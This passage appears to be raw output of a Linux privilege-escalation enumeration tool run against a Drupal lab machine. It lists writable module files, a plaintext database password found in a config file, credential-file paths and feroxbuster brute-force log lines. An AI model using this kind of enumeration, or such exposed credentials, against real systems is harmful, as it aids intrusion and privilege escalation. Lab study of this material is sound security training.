/var/www/modules/book/book\-export\-html\.tpl\.php
/var/www/modules/book/book\-navigation\.tpl\.php
/var/www/modules/book/book\-node\-export\-html\.tpl\.php
/var/www/modules/book/book\-rtl\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/color
/var/www/modules/color/color\-rtl\.css
/var/www/modules/color/color\.css
/var/www/modules/color/color\.info
/var/www/modules/color/color\.install
/var/www/modules/color/color\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/comment
/var/www/modules/comment/comment\-node\-form\.js
/var/www/modules/comment/comment\-rtl\.css
/var/www/modules/comment/comment\-wrapper\.tpl\.php
/var/www/modules/comment/comment\.admin\.inc
/var/www/modules/comment/comment\.api\.php
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/contact
/var/www/modules/contact/contact\.admin\.inc
/var/www/modules/contact/contact\.info
/var/www/modules/contact/contact\.install
/var/www/modules/contact/contact\.module
/var/www/modules/contact/contact\.pages\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/contextual
/var/www/modules/contextual/contextual\-rtl\.css
/var/www/modules/contextual/contextual\.api\.php
/var/www/modules/contextual/contextual\.css
/var/www/modules/contextual/contextual\.info
/var/www/modules/contextual/contextual\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/dashboard
/var/www/modules/dashboard/dashboard\-rtl\.css
/var/www/modules/dashboard/dashboard\.api\.php
/var/www/modules/dashboard/dashboard\.css
/var/www/modules/dashboard/dashboard\.info
/var/www/modules/dashboard/dashboard\.install
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/dblog
/var/www/modules/dblog/dblog\-rtl\.css
/var/www/modules/dblog/dblog\.admin\.inc
/var/www/modules/dblog/dblog\.css
/var/www/modules/dblog/dblog\.info
/var/www/modules/dblog/dblog\.install
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/field
/var/www/modules/field/field\.api\.php
/var/www/modules/field/field\.attach\.inc
/var/www/modules/field/field\.crud\.inc
/var/www/modules/field/field\.default\.inc
/var/www/modules/field/field\.form\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/field/modules/field\_sql\_storage
/var/www/modules/field/modules/field\_sql\_storage/field\_sql\_storage\.info
/var/www/modules/field/modules/field\_sql\_storage/field\_sql\_storage\.install
/var/www/modules/field/modules/field\_sql\_storage/field\_sql\_storage\.module
/var/www/modules/field/modules/field\_sql\_storage/field\_sql\_storage\.test
/var/www/modules/field/modules/list
/var/www/modules/field/modules/list/list\.info
/var/www/modules/field/modules/list/list\.install
/var/www/modules/field/modules/list/list\.module
/var/www/modules/field/modules/list/tests
/var/www/modules/field/modules/list/tests/list\.test
/var/www/modules/field/modules/list/tests/list\_test\.info
/var/www/modules/field/modules/list/tests/list\_test\.module
/var/www/modules/field/modules/number
/var/www/modules/field/modules/number/number\.info
/var/www/modules/field/modules/number/number\.install
/var/www/modules/field/modules/number/number\.module
/var/www/modules/field/modules/number/number\.test
/var/www/modules/field/modules/options
/var/www/modules/field/modules/options/options\.api\.php
/var/www/modules/field/modules/options/options\.info
/var/www/modules/field/modules/options/options\.module
/var/www/modules/field/modules/options/options\.test
/var/www/modules/field/modules/text
/var/www/modules/field/modules/text/text\.info
/var/www/modules/field/modules/text/text\.install
/var/www/modules/field/modules/text/text\.js
/var/www/modules/field/modules/text/text\.module
/var/www/modules/field/modules/text/text\.test
/var/www/modules/field/tests
/var/www/modules/field/tests/field\.test
/var/www/modules/field/tests/field\_test\.entity\.inc
/var/www/modules/field/tests/field\_test\.field\.inc
/var/www/modules/field/tests/field\_test\.info
/var/www/modules/field/tests/field\_test\.install
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/field/theme
/var/www/modules/field/theme/field\-rtl\.css
/var/www/modules/field/theme/field\.css
/var/www/modules/field/theme/field\.tpl\.php
/var/www/modules/field\_ui
/var/www/modules/field\_ui/field\_ui\-rtl\.css
/var/www/modules/field\_ui/field\_ui\.admin\.inc
/var/www/modules/field\_ui/field\_ui\.api\.php
/var/www/modules/field\_ui/field\_ui\.css
/var/www/modules/field\_ui/field\_ui\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/file
/var/www/modules/file/file\.api\.php
/var/www/modules/file/file\.css
/var/www/modules/file/file\.field\.inc
/var/www/modules/file/file\.info
/var/www/modules/file/file\.install
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/file/tests/file\.test
/var/www/modules/file/tests/file\_module\_test\.info
/var/www/modules/file/tests/file\_module\_test\.module
/var/www/modules/filter
/var/www/modules/filter/filter\.admin\.inc
/var/www/modules/filter/filter\.admin\.js
/var/www/modules/filter/filter\.api\.php
/var/www/modules/filter/filter\.css
/var/www/modules/filter/filter\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/filter/tests/filter\.url\-input\.txt
/var/www/modules/filter/tests/filter\.url\-output\.txt
/var/www/modules/forum
/var/www/modules/forum/forum\-icon\.tpl\.php
/var/www/modules/forum/forum\-list\.tpl\.php
/var/www/modules/forum/forum\-rtl\.css
/var/www/modules/forum/forum\-submitted\.tpl\.php
/var/www/modules/forum/forum\-topic\-list\.tpl\.php
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/help
/var/www/modules/help/help\-rtl\.css
/var/www/modules/help/help\.admin\.inc
/var/www/modules/help/help\.api\.php
/var/www/modules/help/help\.css
/var/www/modules/help/help\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/image
/var/www/modules/image/image\-rtl\.css
/var/www/modules/image/image\.admin\.css
/var/www/modules/image/image\.admin\.inc
/var/www/modules/image/image\.api\.php
/var/www/modules/image/image\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/image/tests/image\_module\_test\.info
/var/www/modules/image/tests/image\_module\_test\.module
/var/www/modules/locale
/var/www/modules/locale/locale\-rtl\.css
/var/www/modules/locale/locale\.admin\.inc
/var/www/modules/locale/locale\.api\.php
/var/www/modules/locale/locale\.css
/var/www/modules/locale/locale\.datepicker\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/locale/tests/locale\_test\.info
/var/www/modules/locale/tests/locale\_test\.js
/var/www/modules/locale/tests/locale\_test\.module
/var/www/modules/locale/tests/translations
/var/www/modules/locale/tests/translations/test\.xx\.po
/var/www/modules/menu
/var/www/modules/menu/menu\.admin\.inc
/var/www/modules/menu/menu\.admin\.js
/var/www/modules/menu/menu\.api\.php
/var/www/modules/menu/menu\.css
/var/www/modules/menu/menu\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/node
/var/www/modules/node/content\_types\.inc
/var/www/modules/node/content\_types\.js
/var/www/modules/node/node\.admin\.inc
/var/www/modules/node/node\.api\.php
/var/www/modules/node/node\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/node/tests/node\_access\_test\.info
/var/www/modules/node/tests/node\_access\_test\.install
/var/www/modules/node/tests/node\_access\_test\.module
/var/www/modules/node/tests/node\_test\.info
/var/www/modules/node/tests/node\_test\.module
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/openid
/var/www/modules/openid/openid\-rtl\.css
/var/www/modules/openid/openid\.api\.php
/var/www/modules/openid/openid\.css
/var/www/modules/openid/openid\.inc
/var/www/modules/openid/openid\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/openid/tests/openid\_test\.info
/var/www/modules/openid/tests/openid\_test\.install
/var/www/modules/openid/tests/openid\_test\.module
/var/www/modules/overlay
/var/www/modules/overlay/images
/var/www/modules/overlay/overlay\-child\-rtl\.css
/var/www/modules/overlay/overlay\-child\.css
/var/www/modules/overlay/overlay\-child\.js
/var/www/modules/overlay/overlay\-parent\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/path
/var/www/modules/path/path\.admin\.inc
/var/www/modules/path/path\.api\.php
/var/www/modules/path/path\.info
/var/www/modules/path/path\.js
/var/www/modules/path/path\.module
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/php
/var/www/modules/php/php\.info
/var/www/modules/php/php\.install
/var/www/modules/php/php\.module
/var/www/modules/php/php\.test
/var/www/modules/poll
/var/www/modules/poll/poll\-bar\-\-block\.tpl\.php
/var/www/modules/poll/poll\-bar\.tpl\.php
/var/www/modules/poll/poll\-results\-\-block\.tpl\.php
/var/www/modules/poll/poll\-results\.tpl\.php
/var/www/modules/poll/poll\-rtl\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/profile
/var/www/modules/profile/profile\-block\.tpl\.php
/var/www/modules/profile/profile\-listing\.tpl\.php
/var/www/modules/profile/profile\-wrapper\.tpl\.php
/var/www/modules/profile/profile\.admin\.inc
/var/www/modules/profile/profile\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/rdf
/var/www/modules/rdf/rdf\.api\.php
/var/www/modules/rdf/rdf\.info
/var/www/modules/rdf/rdf\.install
/var/www/modules/rdf/rdf\.module
/var/www/modules/rdf/rdf\.test
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/rdf/tests/rdf\_test\.info
/var/www/modules/rdf/tests/rdf\_test\.install
/var/www/modules/rdf/tests/rdf\_test\.module
/var/www/modules/search
/var/www/modules/search/search\-block\-form\.tpl\.php
/var/www/modules/search/search\-result\.tpl\.php
/var/www/modules/search/search\-results\.tpl\.php
/var/www/modules/search/search\-rtl\.css
/var/www/modules/search/search\.admin\.inc
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/search/tests/UnicodeTest\.txt
/var/www/modules/search/tests/search\_embedded\_form\.info
/var/www/modules/search/tests/search\_embedded\_form\.module
/var/www/modules/search/tests/search\_extra\_type\.info
/var/www/modules/search/tests/search\_extra\_type\.module
/var/www/modules/shortcut
/var/www/modules/shortcut/shortcut\-rtl\.css
/var/www/modules/shortcut/shortcut\.admin\.css
/var/www/modules/shortcut/shortcut\.admin\.inc
/var/www/modules/shortcut/shortcut\.admin\.js
/var/www/modules/shortcut/shortcut\.api\.php
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest
/var/www/modules/simpletest/drupal\_web\_test\_case\.php
/var/www/modules/simpletest/files
/var/www/modules/simpletest/files/README\.txt
/var/www/modules/simpletest/files/css\_test\_files
/var/www/modules/simpletest/files/css\_test\_files/comment\_hacks\.css
/var/www/modules/simpletest/files/css\_test\_files/comment\_hacks\.css\.optimized\.css
/var/www/modules/simpletest/files/css\_test\_files/comment\_hacks\.css\.unoptimized\.css
/var/www/modules/simpletest/files/css\_test\_files/css\_input\_with\_import\.css
/var/www/modules/simpletest/files/css\_test\_files/css\_input\_with\_import\.css\.optimized\.css
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/files/html\-1\.txt
/var/www/modules/simpletest/files/html\-2\.html
/var/www/modules/simpletest/files/javascript\-1\.txt
/var/www/modules/simpletest/files/javascript\-2\.script
/var/www/modules/simpletest/files/php\-1\.txt
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/lib
/var/www/modules/simpletest/lib/Drupal
/var/www/modules/simpletest/lib/Drupal/simpletest
/var/www/modules/simpletest/lib/Drupal/simpletest/Tests
/var/www/modules/simpletest/lib/Drupal/simpletest/Tests/PSR0WebTest\.php
/var/www/modules/simpletest/simpletest\.api\.php
/var/www/modules/simpletest/simpletest\.css
/var/www/modules/simpletest/simpletest\.info
/var/www/modules/simpletest/simpletest\.install
/var/www/modules/simpletest/simpletest\.js
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/actions\.test
/var/www/modules/simpletest/tests/actions\_loop\_test\.info
/var/www/modules/simpletest/tests/actions\_loop\_test\.install
/var/www/modules/simpletest/tests/actions\_loop\_test\.module
/var/www/modules/simpletest/tests/ajax\.test
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/drupal\_system\_listing\_compatible\_test/drupal\_system\_listing\_compatible\_test\.info
/var/www/modules/simpletest/tests/drupal\_system\_listing\_compatible\_test/drupal\_system\_listing\_compatible\_test\.module
/var/www/modules/simpletest/tests/drupal\_system\_listing\_incompatible\_test
/var/www/modules/simpletest/tests/drupal\_system\_listing\_incompatible\_test/drupal\_system\_listing\_incompatible\_test\.info
/var/www/modules/simpletest/tests/drupal\_system\_listing\_incompatible\_test/drupal\_system\_listing\_incompatible\_test\.module
/var/www/modules/simpletest/tests/entity\_cache\_test\.info
/var/www/modules/simpletest/tests/entity\_cache\_test\.module
/var/www/modules/simpletest/tests/entity\_cache\_test\_dependency\.info
/var/www/modules/simpletest/tests/entity\_cache\_test\_dependency\.module
/var/www/modules/simpletest/tests/entity\_crud\_hook\_test\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/psr\_0\_test/lib
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal/psr\_0\_test
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal/psr\_0\_test/Tests
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal/psr\_0\_test/Tests/ExampleTest\.php
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal/psr\_0\_test/Tests/Nested
/var/www/modules/simpletest/tests/psr\_0\_test/lib/Drupal/psr\_0\_test/Tests/Nested/NestedExampleTest\.php
/var/www/modules/simpletest/tests/psr\_0\_test/psr\_0\_test\.info
/var/www/modules/simpletest/tests/psr\_0\_test/psr\_0\_test\.module
/var/www/modules/simpletest/tests/registry\.test
/var/www/modules/simpletest/tests/requirements1\_test\.info
/var/www/modules/simpletest/tests/requirements1\_test\.install
/var/www/modules/simpletest/tests/requirements1\_test\.module
/var/www/modules/simpletest/tests/requirements2\_test\.info
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/themes/test\_basetheme
/var/www/modules/simpletest/tests/themes/test\_basetheme/test\_basetheme\.info
/var/www/modules/simpletest/tests/themes/test\_subtheme
/var/www/modules/simpletest/tests/themes/test\_subtheme/test\_subtheme\.info
/var/www/modules/simpletest/tests/themes/test\_theme
/var/www/modules/simpletest/tests/themes/test\_theme/template\.php
/var/www/modules/simpletest/tests/themes/test\_theme/test\_theme\.info
/var/www/modules/simpletest/tests/unicode\.test
/var/www/modules/simpletest/tests/update\.test
/var/www/modules/simpletest/tests/update\_script\_test\.info
/var/www/modules/simpletest/tests/update\_script\_test\.install
/var/www/modules/simpletest/tests/update\_script\_test\.module
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/upgrade/drupal\-6\.bare\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.comments\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.duplicate\-permission\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.filled\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.forum\.database\.php
#\)You\_can\_write\_even\_more\_files\_inside\_last\_directory

/var/www/modules/simpletest/tests/url\_alter\_test\.info

╔══════════╣ Interesting GROUP writable files \(not in Home\) \(max 500\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files)

Group www\-data:
/var/www/sites/default/files
/var/www/sites/default/files/styles

╔══════════╣ Searching passwords in history files
\* @file
\* @ingroup views\_field\_handlers
\* \{@inheritdoc\}
\* \{@inheritdoc\}
\* \{@inheritdoc\}
\* \{@inheritdoc\}
\* \{@inheritdoc\}
// This code shadows node\_mark, but it reads from the db directly and
\* @file
\* @ingroup views\_filter\_handlers
\* \{@inheritdoc\}
// @todo There are better ways of excluding required and multiple \(object flags\)
\* \{@inheritdoc\}
\* \{@inheritdoc\}
\* \{@inheritdoc\}

╔══════════╣ Searching passwords in config PHP files
'password' =\> 'R0ck3t',

╔══════════╣ Searching \*password\* or \*credential\* files in home \(limit 70\)
/etc/pam\.d/common\-password
/etc/ssl/private/ssl\-cert\-snakeoil\.key
/usr/lib/grub/i386\-pc/password\.mod
/usr/lib/grub/i386\-pc/password\_pbkdf2\.mod
/usr/share/man/man7/credentials\.7\.gz
/usr/share/pam/common\-password
/usr/share/pam/common\-password\.md5sums
/var/cache/debconf/passwords\.dat
/var/lib/pam/password
/var/www/includes/password\.inc
/var/www/modules/simpletest/tests/password\.test
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-no\-password\-token\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-password\-token\.database\.php
/var/www/scripts/password\-hash\.sh

╔══════════╣ Checking for TTY \(sudo/su\) passwords in audit logs

╔══════════╣ Searching passwords inside logs \(limit 70\)
192\.168\.49\.127 \- \- \[11/Apr/2022:03:37:45 \+1000\] "GET /user/password HTTP/1\.1" 200 7617 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd HTTP/1\.1" 403 476 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.asp HTTP/1\.1" 403 480 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.aspx HTTP/1\.1" 403 481 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.html HTTP/1\.1" 403 481 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.jsp HTTP/1\.1" 403 480 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.php HTTP/1\.1" 403 480 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.htpasswd\.txt HTTP/1\.1" 403 480 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd HTTP/1\.1" 403 474 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.asp HTTP/1\.1" 403 478 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.aspx HTTP/1\.1" 403 479 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.html HTTP/1\.1" 403 479 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.jsp HTTP/1\.1" 403 478 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.php HTTP/1\.1" 403 478 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:05 \+1000\] "GET /\.passwd\.txt HTTP/1\.1" 403 478 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password HTTP/1\.1" 403 494 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.asp HTTP/1\.1" 403 498 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.aspx HTTP/1\.1" 403 499 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.html HTTP/1\.1" 403 499 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.jsp HTTP/1\.1" 403 498 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.php HTTP/1\.1" 403 498 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:06 \+1000\] "GET /\.well\-known/change\-password\.txt HTTP/1\.1" 403 498 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:38:16 \+1000\] "GET /user/password HTTP/1\.1" 200 7617 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:40:24 \+1000\] "GET /user/password HTTP/1\.1" 200 7441 "[http://dc-1/"](#http://dc-1/")
"Wget/1\.21"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:47:05 \+1000\] "GET /user/password/ HTTP/1\.1" 200 7387 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:47:13 \+1000\] "GET /?q=user/password/ HTTP/1\.1" 200 7390 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:47:22 \+1000\] "GET /user/password/86049a3486ac45de92bcd8015e674e22 HTTP/1\.1" 200 3172 "\-" "feroxbuster/2\.3\.3"
192\.168\.49\.127 \- \- \[11/Apr/2022:03:47:44 \+1000\] "GET /profiles/password HTTP/1\.1" 500 3833 "\-" "feroxbuster/2\.3\.3"
2019\-02\-19 12:24:56 configure base\-passwd:i386 3\.5\.26 3\.5\.26
2019\-02\-19 12:24:56 install base\-passwd:i386 \<none\> 3\.5\.26
2019\-02\-19 12:24:56 status half\-configured base\-passwd:i386 3\.5\.26
2019\-02\-19 12:24:56 status half\-installed base\-passwd:i386 3\.5\.26
2019\-02\-19 12:24:56 status unpacked base\-passwd:i386 3\.5\.26
2019\-02\-19 12:24:57 status installed base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:05 status half\-configured base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:05 status half\-installed base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:05 status unpacked base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:05 upgrade base\-passwd:i386 3\.5\.26 3\.5\.26
2019\-02\-19 12:25:12 install passwd:i386 \<none\> 1:4\.1\.5\.1\-1
2019\-02\-19 12:25:12 status half\-installed passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 12:25:12 status unpacked passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 12:25:15 configure base\-passwd:i386 3\.5\.26 \<none\>
2019\-02\-19 12:25:15 status half\-configured base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:15 status installed base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:15 status unpacked base\-passwd:i386 3\.5\.26
2019\-02\-19 12:25:19 configure passwd:i386 1:4\.1\.5\.1\-1 \<none\>
2019\-02\-19 12:25:19 status half\-configured passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 12:25:19 status installed passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 12:25:19 status unpacked passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 22:29:36 status half\-configured passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 22:29:36 status half\-installed passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 22:29:36 status unpacked passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 22:29:36 upgrade passwd:i386 1:4\.1\.5\.1\-1 1:4\.1\.5\.1\-1\+deb7u1
2019\-02\-19 22:29:37 status half\-installed passwd:i386 1:4\.1\.5\.1\-1
2019\-02\-19 22:29:37 status unpacked passwd:i386 1:4\.1\.5\.1\-1\+deb7u1
2019\-02\-19 22:29:39 configure passwd:i386 1:4\.1\.5\.1\-1\+deb7u1 \<none\>
2019\-02\-19 22:29:39 status half\-configured passwd:i386 1:4\.1\.5\.1\-1\+deb7u1
2019\-02\-19 22:29:39 status installed passwd:i386 1:4\.1\.5\.1\-1\+deb7u1
2019\-02\-19 22:29:39 status unpacked passwd:i386 1:4\.1\.5\.1\-1\+deb7u1
Description\-de\.UTF\-8: Benutzer und Passwörter einrichten
Description\-de\.UTF\-8: Bitte geben Sie das Passwort zur Bestätigung nochmals ein:
Description\-de\.UTF\-8: Einrichten von Benutzern und Passwörtern \.\.\.
Description\-de\.UTF\-8: GRUB\-Passwort:
Description\-de\.UTF\-8: Leeres Passwort
Description\-de\.UTF\-8: Passworteingabefehler
Description\-de\.UTF\-8: Root\-Passwort:
Description\-de\.UTF\-8: Shadow\-Passwörter benutzen?
Description\-de\.UTF\-8: Wählen Sie ein Passwort für den neuen Benutzer:
Description\-eo\.UTF\-8: Ĉu aktivigi kaŝitajn pasvortojn \('shadow passwords'\)?
Description\-fr\.UTF\-8: Faut\-il activer les mots de passe cachés \(« shadow passwords »\) ?

